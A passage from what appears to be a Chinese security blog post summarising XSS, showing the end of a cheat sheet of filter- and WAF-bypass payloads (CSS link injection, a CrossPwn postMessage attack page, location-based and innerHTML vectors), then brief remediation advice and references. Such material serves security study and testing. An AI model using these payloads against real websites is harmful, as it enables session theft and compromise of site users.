+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style=position:fixed;top:0;left:0;font-size:999px</span><br></pre></td></tr></table></figure>
+
+<p><strong>99.Alternative to Style Tag (替代css样式标记)</strong></p>
+<p>以下payload用于当内联和标记名的<code>&quot;style&quot;</code>关键字被阻止时使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=stylesheet href=//HOST/FILE&gt;</span><br><span class="line">&lt;link rel=stylesheet href=data:text/css,CSS&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>100.Cross-Origin Script - CrossPwn (跨源脚本-CrossPwn)</strong></p>
+<p>将下面的内容另存为.html文件，并按如下方式使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/</span><br><span class="line">status.html&amp;msg=&lt;script&gt;alert(document.domain)</span><br></pre></td></tr></table></figure>
+
+<p>其中”facebook.com”是允许的来源，”localhost”正在攻击域</p>
+<p><code>&quot;//brutelogic.com.br/tests/status.html&quot;</code>是目标页和<code>&quot;&lt;script&gt;alert(document.domain)&quot;</code>是发送的消息（payload）。</p>
+<p>code:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;body onload=&quot;CrossPwn()&quot;&gt;</span><br><span class="line">&lt;h2&gt;CrossPwn&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;OnMessage XSS&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Use target &amp; msg as URL parameters.&lt;/p&gt;</span><br><span class="line">&lt;iframe id=&quot;f&quot; height=&quot;0&quot; style=&quot;visibility:hidden&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">searchParams = new URLSearchParams(document.location.search);</span><br><span class="line">target = searchParams.get(&#x27;target&#x27;);</span><br><span class="line">msg = searchParams.get(&#x27;msg&#x27;);</span><br><span class="line">document.getElementById(&#x27;f&#x27;).setAttribute(&#x27;src&#x27;, target);</span><br><span class="line">function CrossPwn() &#123;frames[0].postMessage(msg,&#x27;*&#x27;)&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>101.Location Based Payloads (基于位置的有效载荷)</strong></p>
+<p>下面的XSS payload使用一种更详细的方法来执行负载，使用文档属性来提供另一个文档属性，即位置属性。这就产生了复杂的向量，对于绕过滤器和<code>waf</code>非常有用。因为它们使用任意标记（<code>XHTML</code>），所以可以使用前面看到的任何未知的事件处理程序。这里，<code>&quot;onmouseover&quot;</code>将用作默认值。在URL中将加号<code>（＋）</code>编码为<code>%2B</code>。</p>
+<p><strong>102.Location Basics (位置基础知识)</strong></p>
+<p>payload与更简单的操作，以实现重定向到javascript伪协议。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;j/onmouseover=location=innerHTML&gt;javascript:alert(1)//</span><br><span class="line">&lt;iframe id=t:alert(1) name=javascrip onload=location=name+id&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>103.Location with URL Fragment (包含URL片段的位置)</strong></p>
+<p>如果在POST请求中需要使用带有未编码符号的payload。，URL必须在操作URL中使用片段。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;javascript/onmouseover=location=tagName+innerHTML+location.hash&gt;:/*hoverme!</span><br><span class="line">&lt;/javascript&gt;#*/alert(1)</span><br><span class="line">&lt;javascript/onmouseover=location=tagName+innerHTML+location.hash&gt;:&#x27;hoverme!</span><br><span class="line">&lt;/javascript&gt;#&#x27;-alert(1)</span><br><span class="line">&lt;javascript:&#x27;-`/onmouseover=location=tagName+URL&gt;hoverme!#`-alert(1)</span><br><span class="line">&lt;j/onmouseover=location=innerHTML+URL&gt;javascript:&#x27;-`hoverme!&lt;/j&gt;#`-alert(1)</span><br><span class="line">&lt;javas/onmouseover=location=tagName+innerHTML+URL&gt;cript:&#x27;-`hoverme!&lt;/javas&gt;</span><br><span class="line">#`-alert(1)</span><br><span class="line">&lt;javascript:/onmouseover=location=tagName+URL&gt;hoverme!#%0Aalert(1)</span><br><span class="line">&lt;j/onmouseover=location=innerHTML+URL&gt;javascript:&lt;/j&gt;#%0Aalert(1)</span><br><span class="line">&lt;javas/onmouseover=location=tagName+innerHTML+URL&gt;cript:&lt;/javas&gt;#%0Aalert(1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>104.Location with Leading Alert (最重要的弹窗位置)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">`-alert(1)&lt;javascript:`/</span><br><span class="line">onmouseover=location=tagName+previousSibling.nodeValue&gt;hoverme!</span><br><span class="line">`-alert(1)&lt;javas/</span><br><span class="line">onmouseover=location=tagName+innerHTML+previousSibling.nodeValue&gt;cript:`hoverme!</span><br><span class="line">&lt;alert(1)&lt;!--/onmouseover=location=innerHTML+outerHTML&gt;javascript:1/*hoverme!*/</span><br><span class="line">&lt;/alert(1)&lt;!--&gt;</span><br><span class="line">&lt;j/1=&quot;*/&quot;&quot;-alert(1)&lt;!--/onmouseover=location=innerHTML+outerHTML&gt;</span><br><span class="line">javascript:/*hoverme!</span><br><span class="line">*/&quot;&lt;j/1=/alert(1)//onmouseover=location=innerHTML+</span><br><span class="line">previousSibling.nodeValue+outerHTML&gt;javascript:/*hoverme!</span><br></pre></td></tr></table></figure>
+
+<p><strong>105.Location with Self URL (last is FF Only) (具有self URL的位置（最后一个仅限FF）)</strong></p>
+<p>以下payload需要用使用输入的易受攻击的参数替换<code>[P&#125;</code>。在URL中将<code>&amp;</code>编码为<code>%26</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg id=?[P]=&lt;svg/onload=alert(1)+ onload=location=id&gt;</span><br><span class="line">&lt;j/onmouseover=location=textContent&gt;?[P]=&lt;svg/onload=alert(1)&gt;hoverme!&lt;/j&gt;</span><br><span class="line">&lt;j/onmouseover=location+=textContent&gt;&amp;[P]=&lt;svg/onload=alert(1)&gt;hoverme!&lt;/j&gt;</span><br><span class="line">&lt;j&amp;[P]=&lt;svg+onload=alert(1)/onmouseover=location+=outerHTML&gt;hoverme!</span><br><span class="line">&lt;/j&amp;[P]=&lt;svg+onload=alert(1)&gt;</span><br><span class="line">&amp;[P]=&lt;svg/onload=alert(1)&gt;&lt;j/</span><br><span class="line">onmouseover=location+=document.body.textContent&gt;hoverme!&lt;/j&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>106.Location with Template Literal (具有模板文本的位置)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;alert(1)&#125;&lt;javascript:`//onmouseover=location=tagName+URL&gt;hoverme!</span><br><span class="line">$&#123;alert(1)&#125;&lt;j/onmouseover=location=innerHTML+URL&gt;javascript:`//hoverme!</span><br><span class="line">$&#123;alert(1)&#125;&lt;javas/onmouseover=location=tagName+innerHTML+URL&gt;cript:`//hoverme!</span><br><span class="line">$&#123;alert(1)&#125;`&lt;javascript:`//</span><br><span class="line">onmouseover=location=tagName+previousSibling.nodeValue&gt;hoverme!</span><br><span class="line">$&#123;alert(1)&#125;`&lt;javas/</span><br><span class="line">onmouseover=location=tagName+innerHTML+previousSibling.nodeValue&gt;cript:`hoverme!</span><br></pre></td></tr></table></figure>
+
+<p><strong>107.Inner &amp; Outer HTML Properties Alternative (内部和外部HTML属性选项)</strong></p>
+<p>最后这些payload利用元素的innerHTML和outerHTML属性得到与位置向量相同的结果。但是他们需要创建一个完整的HTML向量，而不是一个<code>javascript:aler(1)</code>字符串。下面的元素集合可以与索引0一起使用，它们都可以替换下面使用的head或body元素,以便更容易地遵循：<code>all[0]</code>、<code>anchors[0],</code>、<code>embed[0]</code>、<code>forms[0]</code>、<code>images[0]</code>、<code>links[0]</code>和<code>scripts[0]</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg id=&lt;img/src/onerror&amp;#61alert(1)&gt; onload=head.innerHTML=id&gt;</span><br><span class="line">&lt;svg id=&lt;img/src/onerror&amp;#61alert(1)&gt; onload=body.outerHTML=id&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>108.XSS Vector Schemes (XSS向量格式)</strong></p>
+<p>基本上有3种不同的方案来构建基于HTML的XSS向量。所有字符根据有效语法，用于分隔字段的字节显示在下拉列表中。</p>
+<p><code>%x</code>表示从<code>%00</code>到<code>%0F</code>的每个字节，以及<code>%1X</code>。<code>ENT</code>表示HTML实体,这意味着任何允许的字符或字节都可以在它们的HTML实体表单中使用（字符串和数字）。</p>
+<p>最后，注意<code>javascript</code>这个词可能有一些字节介于两者之间</p>
+<p>字符也可以是URL或HTML编码的。</p>
+<p>Vector Scheme 1 (tag name + handler)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure>
+
+<p>Vector Scheme 2 (tag name + attribute + handler)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure>
+
+<p>Vector Scheme 3 (tag name + href|src|data|action|formaction)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
+<li>可在cookie中设置httponly（浏览器禁止页面的js访问带有httponly属性的cookie）</li>
+<li>xss filter（检查输入，设置白名单方式）</li>
+<li>输出检查（编码，转义，常用编码：html编码，js编码，16进制等)</li>
+<li>针对不同位置的输出，使用不同的处理方式</li>
+<li>处理富文本 富文本XSS问题</li>
+<li>header中使用content-Sencurity-Policy字段，规定请求js的域名白名单（CSP策略）</li>
+</ul>
+<p>不信任任何用户的输入，对每个用户的输入都做严格检查，过滤，在输出的时候，对某些特殊字符进行转义，替换等</p>
+<p><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/xss-start-finish/">http://blog.nsfocus.net/xss-start-finish/</a></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://imweb.io/topic/597f40b490ccc00402bb181e">https://imweb.io/topic/597f40b490ccc00402bb181e</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition">https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/13f0b9a15e46">https://www.jianshu.com/p/13f0b9a15e46</a></p>
+<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/107">https://security.tencent.com/index.php/blog/msg/107</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/XSS%E5%A7%BF%E5%8A%BF%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS.html">文件上传xss</a></p>
+<p><a target="_blank" rel="noopener" href="http://avfisher.win/archives/tag/xss">存储型XSS扩大战果</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11441672.html">XSS漏洞的poc与exp</a></p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://yinwc.github.io">Y1ZkRA</a>
+            <p>Link：<a href="https://yinwc.github.io/2020/06/28/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://yinwc.github.io/2020/06/28/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a>
+            <p>Publish date：<a href="https://yinwc.github.io/2020/06/28/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">June 28th 2020, 4:19:43 pm</a>
+            <p>Update date：<a href="https://yinwc.github.io/2020/06/28/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">January 28th 2023, 4:23:59 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2020/07/21/Fastjson%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF/" title="Fastjson漏洞总结">
+                    <div class="nextTitle">Fastjson漏洞总结</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/06/21/Python-scripts/" title="Python-scripts">
+                    <div class="prevTitle">Python-scripts</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:v1zkra@126.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/YinWC" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">漏洞测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">2.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">2.2.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-xss"><span class="toc-number">2.3.</span> <span class="toc-text">DOM xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7"><span class="toc-number">2.4.</span> <span class="toc-text">一些技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-Cheat-Sheet-2020-Edition"><span class="toc-number">2.4.1.</span> <span class="toc-text">XSS_Cheat_Sheet_2020_Edition</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
